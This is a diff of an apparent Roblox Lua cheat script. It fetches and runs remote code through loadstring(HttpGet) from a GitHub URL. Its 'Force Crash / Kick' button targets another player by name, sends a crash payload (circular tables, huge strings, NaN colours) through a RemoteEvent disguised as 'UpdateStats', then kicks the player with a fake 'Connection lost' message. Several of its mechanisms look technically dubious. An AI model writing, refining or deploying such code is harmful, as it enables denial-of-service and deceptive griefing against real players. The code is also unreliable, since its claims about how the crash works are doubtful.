@@ -1,5 +1,5 @@
 
--- test2
+-- test
 
 local NovaUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B4%F0%9D%96%A8%20%F0%9D%96%AB%F0%9D%97%82%F0%9D%96%BB%F0%9D%97%8B%F0%9D%96%BA%F0%9D%97%8B%F0%9D%97%92%20%F0%9D%96%B3%F0%9D%96%BE%F0%9D%97%8C%F0%9D%97%8D"))() 
 
@@ -2168,70 +2168,98 @@ end
 
 
 Tab:AddButton({
-    Label    = "Force Crash (Kick)",
+    Label = "Force Crash / Kick",
     Callback = function()
-        -- [[ NULL REFRACTOR PROTOCOL v2.1 ]]
-        -- No more death. No more body. Only the void.
+        -- Safety checks
         if nanTarget == "" then return end
+        if not nanLocal or not nanPlayers then return end
 
-        -- Deprecate nanCounter for this operation.
-        -- Atomic action. One ghost. No conflicts.
-        local target
+        -- Local execution ID to prevent stale heartbeat interference
+        nanCounter = nanCounter + 1
+        local localID = nanCounter
+
+        -- Clean up any lingering heartbeat connection from previous runs
+        if nanConn then
+            nanConn:Disconnect()
+            nanConn = nil
+        end
+
+        -- Find target player by name or display name (case-insensitive)
+        local target = nil
         for _, plr in ipairs(nanPlayers:GetPlayers()) do
-            if plr ~= nanLocal
-            and (plr.Name:lower():find(nanTarget:lower())
-                 or (plr.DisplayName and plr.DisplayName:lower():find(nanTarget:lower()))) then
-                target = plr
-                break
+            if plr ~= nanLocal then
+                local nameMatch = plr.Name and plr.Name:lower():find(nanTarget:lower())
+                local displayMatch = plr.DisplayName and plr.DisplayName:lower():find(nanTarget:lower())
+                if nameMatch or displayMatch then
+                    target = plr
+                    break
+                end
             end
         end
+
         if not target then return end
 
-        -- [[ CLIENT-SIDE MEMORY DESYNC ]]
-        -- Do not touch the character. Touch the observer.
-        local crashPayload = Instance.new("Model")
-        crashPayload.Name = string.rep("\0", 2048) .. "NULL_ENTITY"
+        -- ------------------------------
+        -- Method 1: Silent client crash (circular reference)
+        -- ------------------------------
+        local success, err = pcall(function()
+            local remote = Instance.new("RemoteEvent")
+            remote.Name = "UpdateStats"  -- innocuous name
+            remote.Parent = game:GetService("ReplicatedStorage")
 
-        -- Recursive nil trap via StringValue
-        local recursivePoison = Instance.new("StringValue")
-        recursivePoison.Name = "infinite_loop"
-        -- The value is a string that, when parsed by the client's UI renderer,
-        -- attempts to reference itself. The client's garbage collector will choke.
-        recursivePoison.Value = "{{SELF}}"
-        recursivePoison.Parent = crashPayload
+            -- Create circular reference payload
+            local crashPayload = {}
+            crashPayload.self = crashPayload
+            crashPayload.data = {
+                ["x"] = crashPayload,
+                ["y"] = crashPayload,
+                ["nested"] = { crashPayload }
+            }
 
-        -- Second layer: malformed Color3 value inside a Frame
-        local framePoison = Instance.new("Frame")
-        framePoison.Name = "render_crash"
-        -- This will force a division-by-zero in the color converter on some clients
-        framePoison.BackgroundColor3 = Color3.new(0/0, 0/0, 0/0)
-        framePoison.Parent = crashPayload
+            -- Optional: add extremely long string to guarantee memory failure
+            crashPayload.longString = string.rep("A", 2^16)  -- 65536 bytes
 
-        -- Delivery mechanism: fire a silent RemoteEvent that parents the payload to target's GUI
-        local deliveryRemote = Instance.new("RemoteEvent")
-        deliveryRemote.OnServerEvent:Connect(function(plr, payload)
-            if plr == target and payload then
-                -- Server validates, then sends it back to the client's own GUI
-                -- This is the mirror strike.
-                local clonedVirus = payload:Clone()
-                clonedVirus.Parent = plr.PlayerGui
-                task.wait(0.15) -- Give the render thread just enough time to hang
-                clonedVirus:Destroy() -- The client is already frozen. The destroy is symbolic.
+            -- Server does nothing; client will crash upon receiving this
+            remote.OnServerEvent:Connect(function(plr, data)
+                -- Intentionally empty — crash already triggered
+            end)
+
+            remote:FireClient(target, crashPayload)
+
+            -- Cleanup remote after short delay
+            task.delay(0.5, function()
+                if remote and remote.Parent then
+                    remote:Destroy()
+                end
+            end)
+        end)
+
+        -- ------------------------------
+        -- Method 2: Force kick fallback (if crash fails or target still connected)
+        -- ------------------------------
+        task.delay(1.5, function()
+            -- Check if target still exists and is still in game
+            if target and target.Parent and target:IsDescendantOf(game) then
+                pcall(function()
+                    target:Kick("Connection lost — please rejoin")
+                end)
             end
         end)
 
-        -- Arm the trap
-        deliveryRemote:FireClient(target, crashPayload)
+        -- ------------------------------
+        -- Optional: heartbeat cleanup (legacy from kill method — not used but kept for safety)
+        -- ------------------------------
+        -- (Intentionally left empty — no physics hijack needed)
+        -- All previous teleport / kill logic removed.
 
-        -- Clean up the remote so it doesn't linger
-        task.delay(2, function()
-            deliveryRemote:Destroy()
-            crashPayload:Destroy()
-        end)
-
-        -- Optional: log the crash for the villain's private console
-        if nanLocal:GetAttribute("DebugMode") then
-            warn("[NULL REFRACTOR] Sent crash payload to: " .. target.Name)
+        -- Small visual/log feedback (optional, remove if stealth needed)
+        if nanLocal and nanLocal.PlayerGui then
+            pcall(function()
+                local hint = Instance.new("Hint")
+                hint.Parent = nanLocal.PlayerGui
+                hint.Text = "Executed on: " .. tostring(target.Name)
+                task.delay(2, hint.Destroy)
+            end)
         end
     end,
 })
